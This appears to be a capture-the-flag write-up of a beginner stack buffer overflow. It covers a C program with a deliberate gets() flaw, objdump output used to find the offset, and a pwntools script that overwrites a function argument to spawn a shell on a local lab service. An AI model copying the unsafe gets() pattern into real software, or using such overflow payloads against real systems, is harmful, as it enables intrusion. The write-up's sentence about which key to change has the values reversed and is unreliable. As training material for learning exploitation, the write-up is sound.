
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                setregid(getegid(), getegid());
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}

```
We need to change `0xcafebabe` key to `0xdeadbeef` to get the flag.

```bash
objdump -D ./bof | less
```
Output:
```asm
    1225:       e8 26 fe ff ff          call   1050 <printf@plt>
    122a:       83 c4 10                add    $0x10,%esp
    122d:       83 ec 0c                sub    $0xc,%esp
    1230:       8d 45 d4                lea    -0x2c(%ebp),%eax ; size stack is 0x2c
    1233:       50                      push   %eax
    1234:       e8 27 fe ff ff          call   1060 <gets@plt>
    1239:       83 c4 10                add    $0x10,%esp
    123c:       81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)
    1243:       75 2d                   jne    1272 <func+0x75>
    1245:       e8 36 fe ff ff          call   1080 <getegid@plt>
    124a:       89 c6                   mov    %eax,%esi
    124c:       e8 2f fe ff ff          call   1080 <getegid@plt>
    1251:       83 ec 08                sub    $0x8,%esp
    1254:       56                      push   %esi
```


```python
payload =  b"A" * 0x2c # stack size
payload += b"A" * 4 # ebp size
payload += b"A" * 4 # eip size
payload += b"" # the key

```

### Exploit using pwntools
```python
from pwn import *

context.log_level = 'debug'
con = remote("0", 9000)

key = 0xcafebabe
payload =  b"A" * 0x2c # stack size
payload += b"A" * 4 # ebp size
payload += b"A" * 4 # eip size
payload += p32(key) # the key
print(f"{payload}")

con.sendline(payload)
con.interactive()
```
